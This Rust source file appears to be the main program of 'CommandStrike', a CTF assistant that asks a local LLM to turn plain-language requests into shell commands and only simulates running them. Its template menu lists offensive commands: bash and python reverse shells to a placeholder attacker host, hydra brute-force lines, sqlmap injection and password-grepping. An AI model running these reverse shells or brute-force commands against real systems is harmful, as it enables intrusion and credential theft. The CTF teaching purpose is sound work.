use anyhow::Result;
use colored::Colorize;
use command_strike::llm::{OllamaClient, OllamaConfig, HistoryItem, check_ollama_running, validate_model, pull_model, get_recommended_models};
use std::io::{self, Write};
use tokio::time::Instant;
use env_logger::Env;

/// Display model selection menu and return the selected model name
async fn select_model() -> Result<String> {
    let recommended_models = get_recommended_models();
    
    println!("\n{}", "Available Models:".cyan().bold());
    println!("{}", "----------------".cyan());
    
    // Display recommended models
    for (i, model) in recommended_models.iter().enumerate() {
        println!("{}. {} ({}) - {}", 
            i + 1, 
            model.name.green().bold(), 
            model.size.yellow(), 
            model.description
        );
    }
    
    // Option for custom model
    println!("{}. {}", 
        recommended_models.len() + 1, 
        "Enter custom model name".green().bold()
    );
    
    // Get user selection
    loop {
        print!("\nSelect model [1-{}]: ", recommended_models.len() + 1);
        io::stdout().flush()?;
        
        let mut choice = String::new();
        io::stdin().read_line(&mut choice)?;
        let choice = choice.trim();
        
        // Parse choice
        match choice.parse::<usize>() {
            Ok(num) if num >= 1 && num <= recommended_models.len() => {
                return Ok(recommended_models[num - 1].name.clone());
            },
            Ok(num) if num == recommended_models.len() + 1 => {
                // Custom model
                print!("Enter model name: ");
                io::stdout().flush()?;
                
                let mut model_name = String::new();
                io::stdin().read_line(&mut model_name)?;
                let model_name = model_name.trim().to_string();
                
                if model_name.is_empty() {
                    println!("{}", "Model name cannot be empty.".red());
                    continue;
                }
                
                return Ok(model_name);
            },
            _ => {
                println!("{}", "Invalid selection. Please try again.".red());
            }
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logger
    env_logger::Builder::from_env(Env::default().default_filter_or("info")).init();
    
    // Header
    println!("{}", "CommandStrike - CTF Assistant".green().bold());
    println!("{}", "================================".green());
    
    // Check if Ollama is running
    println!("Checking if Ollama is running...");
    if !check_ollama_running().await {
        println!("{}", "Error: Ollama is not running. Please start Ollama first.".red().bold());
        println!("You can start Ollama with: ollama serve");
        return Ok(());
    }
    println!("{}", "✓ Ollama is running".green());
    
    // Model selection
    let model = select_model().await?;
    
    // Validate selected model
    println!("Checking if model '{}' is available...", model);
    if !validate_model(&model).await? {
        println!("Model '{}' is not available locally.", model);
        println!("Would you like to pull it from Ollama repository? (y/n)");
        print!("> ");
        io::stdout().flush()?;
        
        let mut choice = String::new();
        io::stdin().read_line(&mut choice)?;
        
        if choice.trim().to_lowercase() == "y" {
            if !pull_model(&model).await? {
                println!("{}", format!("Failed to pull model '{}'.", model).red().bold());
                return Ok(());
            }
            println!("{}", format!("✓ Model '{}' pulled successfully", model).green());
        } else {
            println!("Please select another model or pull it manually with:");
            println!("ollama pull {}", model);
            return Ok(());
        }
    }
    println!("{}", format!("✓ Model '{}' is available", model).green());
    
    // Initialize Ollama client
    let config = OllamaConfig {
        model: model.to_string(),
        temperature: 0.7,
        ..OllamaConfig::default()
    };
    
    let mut client = OllamaClient::with_config(config)?;
    println!("{}", "Ready to assist with CTF challenges!".green());
    
    // Store command history
    let mut history: Vec<HistoryItem> = Vec::new();
    
    // Main interaction loop
    loop {
        print!("\n{}> ", "CommandStrike".cyan().bold());
        io::stdout().flush()?;
        
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
        let input = input.trim();
        
        if input.is_empty() {
            continue;
        }
        
        if input == "exit" || input == "quit" {
            break;
        }
        
        if input == "switch" || input == "model" {
            // Allow changing models during runtime
            let new_model = select_model().await?;
            
            // Validate new model
            if !validate_model(&new_model).await? {
                println!("Model '{}' is not available. Would you like to pull it? (y/n)", new_model);
                print!("> ");
                io::stdout().flush()?;
                
                let mut choice = String::new();
                io::stdin().read_line(&mut choice)?;
                
                if choice.trim().to_lowercase() == "y" {
                    if !pull_model(&new_model).await? {
                        println!("{}", format!("Failed to pull model '{}'.", new_model).red().bold());
                        continue;
                    }
                } else {
                    println!("Keeping current model.");
                    continue;
                }
            }
            
            // Update client with new model
            client.set_model(&new_model);
            println!("{}", format!("Switched to model '{}'", new_model).green());
            continue;
        }
        
        if input == "help" {
            print_help();
            continue;
        }
        
        // Display available models
        if input == "models" {
            let recommended = get_recommended_models();
            println!("\n{}", "Recommended Models:".cyan().bold());
            for model in recommended {
                println!("- {} ({}) - {}", 
                    model.name.green(), 
                    model.size.yellow(), 
                    model.description
                );
            }
            
            println!("\n{}", "Installed Models:".cyan().bold());
            match client.get_available_models().await {
                Ok(models) => {
                    for model in models {
                        println!("- {}", model.green());
                    }
                },
                Err(e) => {
                    println!("{}: {}", "Error fetching models".red().bold(), e);
                }
            }
            continue;
        }
        
        if input == "templates" {
            print_security_templates();
            continue;
        }
        
        // Generate command
        let start = Instant::now();
        println!("Generating command...");
        
        match client.generate_command(input, &history).await {
            Ok(command) => {
                let elapsed = start.elapsed();
                println!("\n{}: {}", "Generated Command".green().bold(), command);
                println!("Generation time: {:.2}s", elapsed.as_secs_f32());
                
                // Ask user if they want to execute this command
                println!("\nWould you like to:");
                println!("1. Execute this command (simulation only)");
                println!("2. Explain what this command does");
                println!("3. Skip and enter a new request");
                
                print!("Choice [1-3]: ");
                io::stdout().flush()?;
                
                let mut choice = String::new();
                io::stdin().read_line(&mut choice)?;
                
                match choice.trim() {
                    "1" => {
                        // Simulate command execution
                        println!("{}", "Simulating command execution...".yellow().italic());
                        let simulated_output = format!("Command '{}' executed successfully.\nThis is simulated output - in a real implementation, the command would be executed with proper safeguards.", command);
                        println!("{}", simulated_output);
                        
                        // Add to history
                        history.push(HistoryItem {
                            user_input: input.to_string(),
                            command: command.clone(),
                            result: simulated_output.to_string(),
                        });
                        
                        // Interpret results
                        println!("\nInterpreting results...");
                        match client.interpret_result(&simulated_output, &history).await {
                            Ok(interpretation) => {
                                println!("\n{}", "Interpretation:".green().bold());
                                println!("{}", interpretation);
                            },
                            Err(e) => {
                                println!("{}: {}", "Error interpreting results".red().bold(), e);
                            }
                        }
                    },
                    "2" => {
                        println!("Explaining command...");
                        let prompt = format!("Explain in detail what this command does and its security implications: {}", command);
                        let system = "You are CommandStrike, a cybersecurity assistant specializing in CTF challenges. Explain commands in detail, breaking down each part and explaining security implications.";
                        
                        let start = Instant::now();
                        match client.stream_response(&prompt, Some(system)).await {
                            Ok(mut stream) => {
                                println!("\n{}", "Explanation:".green().bold());
                                
                                // Print streaming response
                                while let Some(chunk) = stream.receiver.recv().await {
                                    print!("{}", chunk);
                                    io::stdout().flush()?;
                                }
                                println!("\n");
                                
                                let elapsed = start.elapsed();
                                println!("Explanation time: {:.2}s", elapsed.as_secs_f32());
                            },
                            Err(e) => {
                                println!("{}: {}", "Error".red().bold(), e);
                            }
                        }
                    },
                    _ => println!("Skipping to next request"),
                }
            },
            Err(e) => {
                println!("{}: {}", "Error generating command".red().bold(), e);
            }
        }
    }
    
    println!("Thank you for using CommandStrike!");
    Ok(())
}

fn print_help() {
    println!("\n{}", "CommandStrike Commands:".cyan().bold());
    println!("{}", "----------------------".cyan());
    println!("- Enter a security request in natural language");
    println!("- {} - Switch to a different LLM model", "switch".green());
    println!("- {} - View available models", "models".green());
    println!("- {} - Show security command templates", "templates".green());
    println!("- {} - Show this help message", "help".green());
    println!("- {} - Exit CommandStrike", "exit".green());
    
    println!("\n{}", "Example Security Requests:".yellow().bold());
    println!("- Scan for open ports on the local network");
    println!("- Find files containing passwords in the current directory");
    println!("- Check for privilege escalation vulnerabilities");
    println!("- Perform a directory traversal test on a web server");
    println!("- Analyze network traffic for suspicious activity");
}

fn print_security_templates() {
    println!("\n{}", "Security Command Templates:".cyan().bold());
    println!("{}", "-------------------------".cyan());
    
    // Reconnaissance templates
    println!("\n{}", "Network Reconnaissance:".yellow().bold());
    println!("- Host discovery: {}", "nmap -sn 192.168.1.0/24".green());
    println!("- Quick scan: {}", "nmap -T4 -F [target]".green());
    println!("- Full port scan: {}", "nmap -p- -T4 [target]".green());
    println!("- Service scan: {}", "nmap -sV -sC -p [ports] [target]".green());
    println!("- OS detection: {}", "nmap -O [target]".green());
    println!("- Vulnerability scan: {}", "nmap --script vuln [target]".green());
    
    // Web application templates
    println!("\n{}", "Web Application:".yellow().bold());
    println!("- Directory enumeration: {}", "gobuster dir -u [url] -w [wordlist] -x php,html,txt".green());
    println!("- Subdomain enumeration: {}", "gobuster dns -d [domain] -w [wordlist]".green());
    println!("- Web vulnerability scan: {}", "nikto -h [target]".green());
    println!("- SSL/TLS scan: {}", "sslyze [target]:443".green());
    println!("- SQLi test: {}", "sqlmap -u \"[url]\" --forms --batch --dbs".green());
    println!("- XSS test: {}", "xsser --url \"[url]\" --auto".green());
    
    // Password attacks
    println!("\n{}", "Password Attacks:".yellow().bold());
    println!("- SSH brute force: {}", "hydra -l [user] -P [wordlist] [target] ssh".green());
    println!("- FTP brute force: {}", "hydra -l [user] -P [wordlist] [target] ftp".green());
    println!("- Password hash cracking: {}", "hashcat -m [hash_type] -a 0 [hash_file] [wordlist]".green());
    println!("- Generate wordlist: {}", "crunch [min] [max] [charset] -o [output_file]".green());
    
    // Exploitation
    println!("\n{}", "Exploitation:".yellow().bold());
    println!("- Reverse shell (bash): {}", "bash -i >& /dev/tcp/[attacker_ip]/[port] 0>&1".green());
    println!("- Reverse shell (python): {}", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[attacker_ip]\",[port]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'".green());
    println!("- Reverse shell listener: {}", "nc -lvnp [port]".green());
    
    // Post-exploitation
    println!("\n{}", "Post-Exploitation:".yellow().bold());
    println!("- Find SUID binaries: {}", "find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null".green());
    println!("- Find writable files: {}", "find / -writable -type f -not -path \"/proc/*\" -not -path \"/sys/*\" -not -path \"/run/*\" -not -path \"/dev/*\" 2>/dev/null".green());
    println!("- Check sudo privileges: {}", "sudo -l".green());
    println!("- Get system info: {}", "uname -a && cat /etc/*release".green());
    println!("- List listening ports: {}", "netstat -tuln".green());
    
    // File and data analysis
    println!("\n{}", "File Analysis:".yellow().bold());
    println!("- Search for sensitive data: {}", "grep -r \"password\\|user\\|username\\|key\" [directory]".green());
    println!("- View file strings: {}", "strings [file] | grep -i \"password\\|user\\|key\"".green());
    println!("- File metadata: {}", "exiftool [file]".green());
    println!("- Binary analysis: {}", "ltrace/strace [binary]".green());
    
    println!("\n{}", "Note: Replace placeholders like [target], [url], etc. with actual values".red());
}
